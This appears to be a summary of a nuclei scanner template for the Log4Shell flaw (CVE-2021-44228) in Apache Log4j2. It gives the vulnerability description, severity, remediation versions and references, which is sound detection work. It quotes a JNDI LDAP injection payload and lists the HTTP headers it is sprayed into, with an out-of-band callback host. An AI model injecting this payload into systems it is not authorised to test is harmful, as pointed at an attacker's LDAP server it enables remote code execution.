---
cve_id: CVE-2021-44228
template_path: nuclei-templates/http/cves/2021/CVE-2021-44228.yaml
affected_product: Apache Log4j2
severity: critical
authentication: none
external_callback: true
affected_versions: <=2.14.1
preconditions: message lookup substitution enabled; attacker can control log messages or parameters
poc_classification: rce
---

## Vulnerability
Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. An attacker who can control log messages or log message parameters can execute arbitrary code loaded from LDAP servers when message lookup substitution is enabled.

Impact: Successful exploitation of this vulnerability can lead to remote code execution, potentially compromising the affected system.

Remediation: Upgrade to Log4j 2.3.1 (for Java 6), 2.12.3 (for Java 7), or 2.17.0 (for Java 8 and later).

Classification:
- CVSS: 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)
- CWE: CWE-20,CWE-917
- CPE: cpe:2.3:a:apache:log4j:*:*:*:*:*:*:*:*

## PoC / Detection
Classification: rce

The template sends two raw HTTP GET requests. The first injects a JNDI LDAP payload (`${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.uri.{{interactsh-url}}/a}`) into the query string. The second injects identical JNDI LDAP payloads (using randomized subdomains pointing to interactsh) into 20+ common HTTP headers (Accept, Accept-Encoding, Accept-Language, Cookie, Referer, User-Agent, X-Forwarded-For, X-Origin, etc.) that are typically logged by Java applications. Detection relies on confirming out-of-band DNS callbacks to the interactsh server via word matcher on `interactsh_protocol: dns` and regex matchers extracting the randomized identifier patterns from the interactsh request.

## References
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- https://github.com/advisories/GHSA-jfh8-c2jp-5v3q
- https://www.lunasec.io/docs/blog/log4j-zero-day/
- https://gist.github.com/bugbountynights/dde69038573db1c12705edb39f9a704a
